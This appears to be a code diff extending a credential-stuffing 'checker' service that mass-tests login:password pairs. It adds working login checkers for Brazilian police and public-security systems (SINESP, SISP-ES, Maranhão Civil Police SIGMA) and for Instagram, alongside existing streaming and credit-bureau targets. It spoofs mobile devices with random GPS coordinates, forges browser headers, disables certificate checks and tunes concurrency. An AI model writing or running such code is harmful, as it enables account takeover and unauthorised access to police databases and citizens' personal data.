@@ -67,7 +67,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma";
 
 export interface CheckResult {
   credential: string;
@@ -1770,89 +1770,303 @@ async function checkParamount(login: string, password: string): Promise<CheckRes
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-//  SINESP SEGURANÇA CHECKER — https://seguranca.sinesp.gov.br/sinesp-seguranca/login.jsf
-//  Strategy: OAuth2 password grant via oauth2.sinesp.gov.br
-//  Needs Brazilian residential proxy — government API blocks non-BR IPs.
-//  app-key sourced from the official SINESP mobile app (public value).
+//  SINESP SEGURANÇA CHECKER — Mobile JSON API
+//  Strategy: POST JSON to mobile session endpoint with randomised GPS coords.
+//  HTTP 400 with mensagem = FAIL (wrong credentials).
+//  Any other 2xx or non-400 auth response = HIT (returns session token/data).
+//  No proxy required for this mobile endpoint.
 // ═══════════════════════════════════════════════════════════════════════════════
-const SINESP_OAUTH_URL   = "https://oauth2.sinesp.gov.br/oauth2/token";
-const SINESP_CLIENT_ID   = "e0bd2d75c0d021d270c8f58a056b746d";
-const SINESP_TIMEOUT     = 25_000;
+const SINESP_MOBILE_URL = "https://seguranca.sinesp.gov.br/sinesp-seguranca/api/sessao_autenticada/mobile";
+const SINESP_TIMEOUT    = 20_000;
 
 async function checkSinesp(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
 
-  // Normalise CPF: strip dots/dashes (e.g. 000.000.000-00 → 00000000000)
-  const cpf = login.replace(/[\.\-]/g, "").trim();
+  // Randomise GPS coordinates to simulate different mobile devices
+  const latitude    = (Math.random() * 180 - 90).toFixed(6);
+  const longitude   = (Math.random() * 360 - 180).toFixed(6);
+  const instalacao  = `${Math.floor(Math.random() * 9000 + 1000)}-A035-49A3-A302-${Math.floor(Math.random() * 9000 + 1000)}`;
 
-  const body = [
-    "grant_type=password",
-    `username=${encodeURIComponent(cpf)}`,
-    `password=${encodeURIComponent(password)}`,
-    `client_id=${SINESP_CLIENT_ID}`,
-    "scope=openid",
-  ].join("&");
-
-  // Residential proxy required — SINESP blocks non-BR IPs
-  const proxyArgs = getStreamingProxyArgs();
+  const payload = JSON.stringify({
+    longitude,
+    dispositivo:  "iPhone",
+    latitude,
+    usuario:      login,
+    instalacao,
+    aplicativo:   "APP_AGENTE_CAMPO",
+    senha:        password,
+  });
 
   try {
     const result = await runCurl([
-      ...proxyArgs,
       "-X", "POST",
-      "-H", "Content-Type: application/x-www-form-urlencoded",
-      "-H", `User-Agent: SINESPSeguranca/0.4.2 (Android 10)`,
+      "-H", "Content-Type: application/json",
+      "-H", "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Mobile/14E304",
       "-H", "Accept: application/json",
-      "-H", "Accept-Language: pt-BR,pt;q=0.9",
-      "--data-raw", body,
-      SINESP_OAUTH_URL,
+      "--data-raw", payload,
+      SINESP_MOBILE_URL,
     ], SINESP_TIMEOUT);
 
-    const resp = result.body;
+    const body = result.body;
 
-    if (result.statusCode === 200) {
+    // 400 = credential rejected (wrong login/password)
+    if (result.statusCode === 400) {
       try {
-        const j = JSON.parse(resp) as Record<string, unknown>;
-        if (j.access_token) {
-          const info: string[] = [];
-          // Decode JWT payload for user info
-          try {
-            const payload = JSON.parse(
-              Buffer.from((j.access_token as string).split(".")[1], "base64url").toString("utf8"),
-            ) as Record<string, unknown>;
-            const name = (payload.name ?? payload.preferred_username ?? payload.sub ?? "") as string;
-            const cpfVal = (payload.cpf ?? payload.username ?? "") as string;
-            const orgs  = (payload.organizations ?? payload.roles ?? []) as string[];
-            if (name)   info.push(`nome:${name.slice(0, 40)}`);
-            if (cpfVal) info.push(`cpf:${cpfVal}`);
-            if (orgs.length) info.push(`org:${orgs.slice(0, 2).join(",")}`);
-          } catch { info.push("oauth2_token_ok"); }
-          return { credential, login, status: "HIT", detail: info.join(" | ") || "sinesp_autenticado" };
-        }
-        if (j.error) {
-          const e = String(j.error_description ?? j.error).slice(0, 80);
-          return { credential, login, status: "FAIL", detail: e };
-        }
-      } catch { /**/ }
+        const j = JSON.parse(body) as Record<string, unknown>;
+        const msg = String(j.mensagem ?? j.message ?? j.error ?? "credenciais_invalidas").slice(0, 80);
+        return { credential, login, status: "FAIL", detail: msg };
+      } catch {
+        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+      }
     }
 
-    if (result.statusCode === 401 || result.statusCode === 400) {
+    // 2xx or session response = authenticated
+    if (result.statusCode >= 200 && result.statusCode < 300) {
+      const info: string[] = [`usuario:${login}`];
       try {
-        const j = JSON.parse(resp) as Record<string, unknown>;
-        const e = String(j.error_description ?? j.error ?? "invalid_credentials").slice(0, 80);
-        return { credential, login, status: "FAIL", detail: e };
-      } catch {
-        return { credential, login, status: "FAIL", detail: "invalid_credentials" };
-      }
+        const j = JSON.parse(body) as Record<string, unknown>;
+        const nome  = (j.nome ?? j.nomeUsuario ?? j.nome_usuario ?? "") as string;
+        const cpf   = (j.cpf ?? j.login ?? "") as string;
+        const token = (j.token ?? j.sessao ?? j.sessionId ?? "") as string;
+        if (nome)  info.push(`nome:${String(nome).slice(0, 40)}`);
+        if (cpf && cpf !== login) info.push(`cpf:${cpf}`);
+        if (token) info.push(`session:${String(token).slice(0, 24)}...`);
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail: info.join(" | ") };
     }
 
     if (result.statusCode === 0 || result.statusCode >= 500)
       return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
 
     if (result.statusCode === 403)
-      return { credential, login, status: "ERROR", detail: "IP_BLOCKED_USE_BR_PROXY" };
+      return { credential, login, status: "ERROR", detail: "ACESSO_BLOQUEADO" };
 
-    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${resp.slice(0, 60)}` };
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${body.slice(0, 60)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  INSTAGRAM CHECKER — https://www.instagram.com/accounts/login/ajax/
+//  Strategy: GET homepage → extract CSRF/mid/ig_did cookies → POST AJAX login
+//  "authenticated":true = HIT | "checkpoint_required" = 2FA (FAIL) | else FAIL
+// ═══════════════════════════════════════════════════════════════════════════════
+const INSTAGRAM_URL     = "https://www.instagram.com/";
+const INSTAGRAM_LOGIN   = "https://www.instagram.com/accounts/login/ajax/";
+const INSTAGRAM_TIMEOUT = 25_000;
+
+async function checkInstagram(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/ig_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  try {
+    // Step 1: GET homepage to grab CSRF/mid/ig_did cookies
+    const getResult = await runCurl([
+      "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "-H", "Pragma: no-cache",
+      INSTAGRAM_URL,
+    ], INSTAGRAM_TIMEOUT);
+
+    if (getResult.statusCode === 0 || getResult.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
+
+    // Extract CSRF token from cookies
+    let csrfToken = "";
+    try {
+      const m = getResult.body.match(/"csrf_token":"([^"]+)"/);
+      if (m) csrfToken = m[1];
+      if (!csrfToken) {
+        const m2 = getResult.body.match(/csrfmiddlewaretoken['" ]+value=['"]([^'"]+)/);
+        if (m2) csrfToken = m2[1];
+      }
+    } catch { /**/ }
+
+    // Step 2: POST AJAX login
+    const ts       = Math.floor(Date.now() / 1000);
+    const postData = [
+      `username=${encodeURIComponent(login)}`,
+      `enc_password=${encodeURIComponent(`#PWD_INSTAGRAM_BROWSER:0:${ts}:${password}`)}`,
+      "queryParams=%7B%7D",
+      "optIntoOneTap=false",
+      "stopDeletionNonce=",
+      "trustedDeviceRecords=%7B%7D",
+    ].join("&");
+
+    const postResult = await runCurl([
+      "-X", "POST",
+      "-c", cookieFile, "-b", cookieFile,
+      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", "Accept: */*",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "-H", "Origin: https://www.instagram.com",
+      "-H", "Referer: https://www.instagram.com/",
+      "-H", "Sec-Fetch-Dest: empty",
+      "-H", "Sec-Fetch-Mode: cors",
+      "-H", "Sec-Fetch-Site: same-origin",
+      "-H", "X-Requested-With: XMLHttpRequest",
+      "-H", "x-ig-app-id: 936619743392459",
+      "-H", "x-ig-www-claim: 0",
+      ...(csrfToken ? ["-H", `X-CSRFToken: ${csrfToken}`] : []),
+      "--data-raw", postData,
+      INSTAGRAM_LOGIN,
+    ], INSTAGRAM_TIMEOUT);
+
+    const resp  = postResult.body;
+    const rLow  = resp.toLowerCase();
+
+    if (resp.includes('"authenticated":true')) {
+      const info: string[] = [`user:${login}`];
+      try {
+        const j = JSON.parse(resp) as Record<string, unknown>;
+        const userId = (j.userId ?? j.user_id ?? "") as string;
+        if (userId) info.push(`id:${userId}`);
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail: info.join(" | ") };
+    }
+
+    if (resp.includes('"checkpoint_required"'))
+      return { credential, login, status: "FAIL", detail: "2FA_checkpoint_required" };
+
+    if (resp.includes('"authenticated":false'))
+      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+
+    if (rLow.includes("please wait") || postResult.statusCode === 429)
+      return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
+
+    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
+
+    return { credential, login, status: "FAIL", detail: `HTTP_${postResult.statusCode}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  } finally {
+    try { await import("fs").then(fs => fs.promises.unlink(cookieFile)); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SISP-ES CHECKER — https://portal.sisp.es.gov.br (Sistema de Informações de Segurança Pública ES)
+//  Strategy: POST j_security_check (Java EE form auth).
+//  Success: 302 redirect away from login page OR 200 with dashboard content.
+//  Failure: redirected back to login / remains at j_security_check.
+// ═══════════════════════════════════════════════════════════════════════════════
+const SISPES_LOGIN_URL = "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/j_security_check";
+const SISPES_BASE_URL  = "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/";
+const SISPES_TIMEOUT   = 20_000;
+
+async function checkSispEs(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/sispes_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  try {
+    const postData = [
+      `j_username=${encodeURIComponent(login)}`,
+      `j_password=${encodeURIComponent(password)}`,
+      "j_idt19=j_idt19",
+      "j_idt19%3Aj_idt20.x=27",
+      "j_idt19%3Aj_idt20.y=8",
+      "javax.faces.ViewState=723520734359744078%3A5969372455684443261",
+    ].join("&");
+
+    const result = await runCurl([
+      "-X", "POST",
+      "-k",
+      "-L", "--max-redirs", "8",
+      "-c", cookieFile, "-b", cookieFile,
+      "-H", `User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", `Referer: ${SISPES_BASE_URL}pesquisa.jsf`,
+      "--data-raw", postData,
+      SISPES_LOGIN_URL,
+    ], SISPES_TIMEOUT);
+
+    const body    = result.body;
+    const bodyLow = body.toLowerCase();
+
+    // Success markers: dashboard/pesquisa content indicates login worked
+    if (
+      body.includes("Pesquisa") || body.includes("Sair") ||
+      body.includes("Bem-vindo") || body.includes("pesquisa.jsf") ||
+      body.includes("logout") || body.includes("SISP-ES") && !body.includes("j_security_check")
+    ) {
+      return { credential, login, status: "HIT", detail: `usuario:${login} | sisp-es_autenticado` };
+    }
+
+    // Failure markers
+    if (
+      bodyLow.includes("senha inválida") || bodyLow.includes("usuário inválido") ||
+      bodyLow.includes("login") || bodyLow.includes("j_security_check") ||
+      body.includes("j_username")
+    ) {
+      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+    }
+
+    if (result.statusCode === 0 || result.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+
+    // If we got 200 with unknown content
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:unknown_response` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  } finally {
+    try { await import("fs").then(fs => fs.promises.unlink(cookieFile)); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SIGMA CHECKER — https://sigma.policiacivil.ma.gov.br (Polícia Civil do Maranhão)
+//  Strategy: POST username/password form to root URL.
+//  HIT: "Painel de atividades" in response body.
+//  FAIL: any other response.
+// ═══════════════════════════════════════════════════════════════════════════════
+const SIGMA_URL     = "https://sigma.policiacivil.ma.gov.br";
+const SIGMA_TIMEOUT = 20_000;
+
+async function checkSigma(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+
+  try {
+    const postData = `username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}`;
+
+    const result = await runCurl([
+      "-X", "POST",
+      "-k", "-L", "--max-redirs", "8",
+      "-H", "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "-H", `Origin: ${SIGMA_URL}`,
+      "-H", `Referer: ${SIGMA_URL}/`,
+      "-H", "Sec-Fetch-Site: same-origin",
+      "-H", "Sec-Fetch-Mode: navigate",
+      "--data-raw", postData,
+      SIGMA_URL,
+    ], SIGMA_TIMEOUT);
+
+    const body = result.body;
+
+    if (body.includes("Painel de atividades") || body.includes("painel") && body.includes("Sair")) {
+      const info: string[] = [`usuario:${login}`];
+      // Try to extract user name from the dashboard
+      const nomeM = body.match(/Olá,?\s+([^<\n,]{3,40})/i) ?? body.match(/nome[^>]*>([^<]{3,40})/i);
+      if (nomeM) info.push(`nome:${nomeM[1].trim()}`);
+      return { credential, login, status: "HIT", detail: info.join(" | ") };
+    }
+
+    if (body.includes("Senha inválida") || body.includes("Usuário inválido") ||
+        body.includes("Usuário ou senha") || body.includes("username") && body.includes("password"))
+      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+
+    if (result.statusCode === 0 || result.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+
+    return { credential, login, status: "FAIL", detail: `HTTP_${result.statusCode}` };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
   }
@@ -1965,8 +2179,11 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   hbomax:        4,   // OAuth2 — fast
   disney:        3,   // BAMTech 2-step — moderate
   paramount:     4,   // REST API — fast
-  sinesp:        2,   // OAuth2 gov.br — needs BR proxy, moderate
+  sinesp:        3,   // Mobile JSON API — fast (no proxy needed)
   serasa_exp:    3,   // IAM REST API — fast
+  instagram:     2,   // AJAX 2-step — moderate (rate-limited)
+  sispes:        2,   // Java EE form auth — conservative
+  sigma:         3,   // Form POST — moderate
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -1987,6 +2204,9 @@ function resolveChecker(target: CheckerTarget) {
     case "paramount":     return checkParamount;
     case "sinesp":        return checkSinesp;
     case "serasa_exp":    return checkSerasaExp;
+    case "instagram":     return checkInstagram;
+    case "sispes":        return checkSispEs;
+    case "sigma":         return checkSigma;
     default:              return checkIseek;
   }
 }
@@ -2018,7 +2238,7 @@ router.post("/checker/check", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma"];
   if (!validTargets.includes(target as CheckerTarget)) {
     res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa, crunchyroll, netflix, amazon, hbomax, disney, paramount" });
     return;
@@ -2055,7 +2275,7 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma"];
   if (!validTargets.includes(target as CheckerTarget)) {
     res.status(400).json({ error: "Invalid target" });
     return;
